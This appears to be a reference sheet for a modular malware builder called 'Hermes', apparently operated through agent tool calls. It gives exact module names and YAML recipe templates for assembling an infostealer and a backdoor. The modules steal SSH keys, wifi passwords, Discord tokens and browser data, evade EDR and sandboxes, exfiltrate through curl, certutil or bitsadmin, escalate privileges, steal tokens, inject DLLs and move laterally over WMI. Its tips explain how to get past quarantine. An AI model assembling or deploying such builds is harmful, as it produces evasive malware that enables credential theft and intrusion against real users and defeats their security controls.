# Hermes Quick Reference

This is a compact reference for valid chunk names and common patterns. Use exact names — typos cause build failures.

## Valid Chunk Names (exact match required)

### Collectors (use for data gathering)
```
collectors/system_info          # NOT sysinfo, NOT system_info_api
collectors/processes            # NOT process_list, NOT processes_api
collectors/browser_chromium     # Chromium browser data
collectors/screenshot           # Requires interactive session (RDP/schtasks /IT)
collectors/clipboard
collectors/env_vars
collectors/netinfo
collectors/wifi_passwords
collectors/discord_tokens
collectors/ssh_keys
collectors/installed_software
collectors/active_windows
```

### Evasion (pick 2-4 per recipe)
```
evasion/etw_patch               # NOT etw_bypass
evasion/etw_full_patch          # More thorough ETW patching
evasion/stack_spoof             # Stack spoofing (works well)
evasion/anti_sandbox            # General sandbox detection
evasion/anti_sandbox_wmi        # WMI-based sandbox detection
evasion/anti_debug              # Multi-method debugger detection
evasion/sleep_ekko              # Sleep obfuscation variants
evasion/sleep_foliage
evasion/sleep_cronos
evasion/checksum_spoof          # PE checksum modification
evasion/debug_dir_strip         # Strip debug directory
```

### C2 (for backdoors - bidirectional, NOT exfil)
```
c2/tcp_beacon                   # Raw TCP with TLV protocol
c2/winhttp_beacon               # HTTP-based, looks like normal traffic
c2/dns_c2                       # DNS TXT record C2
```

### Exfil (for infostealers - one-way data out)
```
exfil/tcp_direct                # Raw TCP
exfil/tcp_flush                 # TCP with flush_to_c2
exfil/winhttp_api               # HTTP POST via WinHTTP
exfil/curl_lolbin               # LOLBin via curl.exe
exfil/certutil_lolbin           # LOLBin via certutil.exe
exfil/bitsadmin_lolbin          # LOLBin via bitsadmin.exe
```

### Architecture
```
arch/sequential                 # Simple, reliable - runs collectors in order
arch/backdoor                   # Beacon loop - REQUIRES c2/* not exfil/*
arch/backdoor_staged            # Collect first, then enter beacon loop
arch/threaded                   # Parallel collector execution
arch/callback_abuse             # Uses Windows callback mechanisms
```

### API Resolution (required for EDR bypass)
```
api_resolve/api_hash_djb2       # DJB2 hash-based resolution
api_resolve/api_hash_ror13      # ROR13 hash-based resolution
api_resolve/api_hash_fnv1a      # FNV-1a hash-based resolution
```

## Common Mistakes

| Wrong | Correct | Issue |
|-------|---------|-------|
| `collectors/process_list` | `collectors/processes` | Wrong name |
| `collectors/sysinfo` | `collectors/system_info` | Wrong name |
| `evasion/etw_bypass` | `evasion/etw_patch` | Wrong name |
| `exfil/* with arch/backdoor` | `c2/* with arch/backdoor` | Backdoor needs bidirectional C2 |
| No api_resolve | Add `api_resolve/api_hash_djb2` | Required for EDR bypass |

## Recipe Templates

### Infostealer (one-shot data collection)
```yaml
core: [core/emit_buffer, core/run_cmd]
collectors: [collectors/system_info, collectors/processes]
exfil: exfil/tcp_direct
arch: arch/sequential
api_resolve: api_resolve/api_hash_djb2
resources: true
evasion: [evasion/stack_spoof, evasion/anti_sandbox]
vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
```

### Backdoor (persistent beacon)
```yaml
core: [core/emit_buffer, core/run_cmd, core/file_ops]
collectors: [collectors/system_info, collectors/processes]
exfil: c2/tcp_beacon              # NOTE: c2/* not exfil/*
arch: arch/backdoor
api_resolve: api_resolve/api_hash_djb2
resources: true
evasion:
  - evasion/stack_spoof
  - evasion/indirect_syscall
  # Include privesc/lateral/injection for post-exploitation capabilities:
  - privesc/uac_fodhelper         # UAC bypass
  - privesc/token_steal           # Token stealing
  - privesc/getsystem_pipe        # Get SYSTEM
  - injection/dll_inject          # DLL injection
  - lateral/wmi_exec              # Lateral movement via WMI
commands:
  - commands/cmd_sysinfo
  - commands/cmd_processes
  - commands/cmd_exec
  # Post-exploitation commands (require the matching chunks above):
  - commands/cmd_getsystem        # 0x20 — uses privesc/getsystem_pipe
  - commands/cmd_uac_bypass       # 0x21 — uses privesc/uac_fodhelper
  - commands/cmd_token            # 0x22 — uses privesc/token_steal
  - commands/cmd_inject           # 0x23 — uses injection/dll_inject
  - commands/cmd_lateral          # 0x24 — uses lateral/wmi_exec
vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
```

## Validation Flow

1. `list_chunks category=<cat>` — Get exact chunk names
2. `create_recipe` — Use exact names from list_chunks output
3. `assemble recipe=<name> compile=true` — Build
4. `deploy_to_vm` — Upload and execute
5. `analyze_results` — Check success/failure

## Post-Exploitation Commands (for backdoor recipes)

Add these to `commands:` section in backdoor recipes:

```
commands/cmd_getsystem      # 0x20 — Elevate to SYSTEM via named pipe
commands/cmd_uac_bypass     # 0x21 — UAC bypass (fodhelper/eventvwr/sdclt)
commands/cmd_token          # 0x22 — Steal/impersonate tokens
commands/cmd_inject         # 0x23 — DLL injection into target process
commands/cmd_lateral        # 0x24 — Lateral movement (WMI/schtasks/WinRM/DCOM)
```

These require the corresponding privesc/lateral/injection chunks as dependencies.

## Debugging

- **NO_C2**: Check C2 listener is running, correct port, correct protocol
- **QUARANTINED**: Try different evasion combo, add api_resolve
- **Compilation failed**: Check chunk compatibility, use `obfuscation=none` first
